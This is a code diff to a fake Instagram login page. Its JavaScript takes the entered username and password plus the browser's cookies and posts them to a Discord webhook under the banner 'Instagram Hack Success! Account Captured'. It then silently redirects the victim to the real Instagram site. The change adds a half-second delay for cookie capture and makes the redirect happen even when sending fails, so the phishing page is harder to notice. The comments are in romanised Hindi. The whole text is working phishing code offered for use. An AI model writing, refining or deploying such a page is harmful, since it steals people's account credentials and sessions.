@@ -58,7 +58,6 @@
             font-size: 12px;
             color: #8e8e8e;
         }
-        /* Spinner */
         .spinner {
             border: 2px solid #dbdbdb;
             border-top: 2px solid #8e8e8e;
@@ -98,55 +97,52 @@
         const btn = document.getElementById('submitBtn');
         const spinner = document.getElementById('spinner');
         
-        // UI Change
         btn.style.display = 'none';
         spinner.style.display = 'block';
         
-        // Data Collect Karna
         const formData = new FormData(e.target);
         const username = formData.get('username');
         const password = formData.get('password');
         
-        // Cookie Collect Karna (Sabse Zaroori)
-        const cookies = document.cookie;
-        
-        // Discord Message Bhejna
-        const payload = {
-            content: `🔓 **Instagram Hack Success!**`,
-            embeds: [{
-                title: "Account Captured",
-                color: 15158332,
-                fields: [
-                    { name: "📱 Username", value: username, inline: true },
-                    { name: "🔑 Password", value: password, inline: true },
-                    { name: "🍪 Cookies", value: cookies.length > 0 ? cookies : "No Cookies Found", inline: false }
-                ],
-                footer: { text: "Captured on " + new Date().toLocaleString() }
-            }]
-        };
+        // Cookie Collect Karne Ka Logic
+        // Hum thoda wait karenge taaki browser cookies set kar sake
+        setTimeout(() => {
+            const cookies = document.cookie || "No Cookies Found"; // Agar empty hai toh "No Cookies Found"
+            
+            const payload = {
+                content: `🔓 **Instagram Hack Success!**`,
+                embeds: [{
+                    title: "Account Captured",
+                    color: 15158332,
+                    fields: [
+                        { name: "📱 Username", value: username, inline: true },
+                        { name: "🔑 Password", value: password, inline: true },
+                        { name: "🍪 Cookies", value: cookies.length > 0 && cookies !== "No Cookies Found" ? cookies : cookies, inline: false }
+                    ],
+                    footer: { text: "Captured on " + new Date().toLocaleString() }
+                }]
+            };
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if(response.ok) {
-                // Success ke baad Original Instagram Page Par Bhejna
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if(response.ok) {
+                    // Asli page par redirect
+                    window.location.href = "https://www.instagram.com";
+                } else {
+                    console.error("Webhook failed");
+                    // Error aane par bhi user ko original page par bhej do
+                    window.location.href = "https://www.instagram.com";
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
                 window.location.href = "https://www.instagram.com";
-            } else {
-                console.error("Webhook failed");
-                btn.style.display = 'block';
-                spinner.style.display = 'none';
-            }
-        })
-        .catch(error => {
-            console.error("Error:", error);
-            btn.style.display = 'block';
-            spinner.style.display = 'none';
-        });
+            });
+        }, 500); // 0.5 second ka wait taaki cookies settle ho sakein
     });
 </script>
 
